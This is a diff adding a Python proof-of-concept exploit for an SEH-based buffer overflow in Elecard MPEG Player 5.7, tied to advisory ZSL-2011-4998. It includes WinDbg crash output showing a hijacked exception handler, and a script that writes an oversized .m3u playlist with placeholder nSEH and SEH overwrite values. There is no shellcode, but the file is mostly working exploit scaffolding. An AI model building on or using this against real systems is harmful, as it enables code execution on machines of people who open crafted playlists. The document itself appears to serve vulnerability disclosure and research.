@@ -1,0 +1,81 @@
+#!/usr/bin/python
+#
+#
+# Elecard MPEG Player 5.7 Local Buffer Overflow PoC (SEH)
+#
+#
+# Vendor: Elecard Group
+# Product web page: http://www.elecard.com
+# Affected version: 5.7.100629
+#
+# Summary: Elecard MPEG Player is a high-quality full-featured multimedia 
+# player supporting the newest formats, designed to provide you with 
+# video and audio playback.
+#
+# Desc: The program suffers from a buffer overflow (SEH) vulnerability
+# when opening playlist file (.m3u), as a result of adding extra bytes. 
+#
+#
+# ---------------------------------------------------------------------
+#
+# (d08.33c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000104 ebx=000037bb ecx=0000002a edx=00000104 esi=0013c73c edi=0013ffff
+# eip=0045563e esp=0013c6c0 ebp=0013cb14 iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
+# *** ERROR: Module load completed but symbols could not be loaded for image00400000
+# image00400000+0x5563e:
+# 0045563e f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+# Missing image name, possible paged-out or corrupt data.
+# Missing image name, possible paged-out or corrupt data.
+# Missing image name, possible paged-out or corrupt data.
+# 0:000> g
+# (d08.33c): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000000 ebx=00000000 ecx=44444444 edx=7c9032bc esi=00000000 edi=00000000
+# eip=44444444 esp=0013c2f0 ebp=0013c310 iopl=0         nv up ei pl zr na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246
+# <Unloaded_i.dll>+0x44444443:
+# 44444444 ??              ???
+# 0:000> !exchain
+# 0013c304: ntdll!RtlConvertUlongToLargeInteger+7e (7c9032bc)
+# 0013cb04: <Unloaded_i.dll>+44444443 (44444444)
+# Invalid exception stack at 43434343
+#
+# ---------------------------------------------------------------------
+#
+#
+# Tested on: Microsoft Windows XP Professional SP3 (English)
+#
+# Vulnerability discovered by: badc0re (Dame Jovanoski)
+#
+#
+# Advisory ID: ZSL-2011-4998
+# Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2011-4998.php
+#
+# 24.02.2011
+#
+# Special Thanks to:
+#
+# LiquidWorm (the master :P)
+# Corelanc0der(great tutorials and forum)
+#
+
+
+f=open("default5.m3u","w")
+print "Creating expoit."
+head="#EXTM3U\n"
+head+="#EXTINF:153,Artist - song\n"
+junk="\x42"*4
+nseh="\x43"*4 
+seh="\x44"*4 
+junk1="\x41"*20165 
+
+try:    
+    f.write(head+junk1+nseh+seh+junk)
+    f.close()
+    print "File created"
+except:
+    print "File cannot be created"
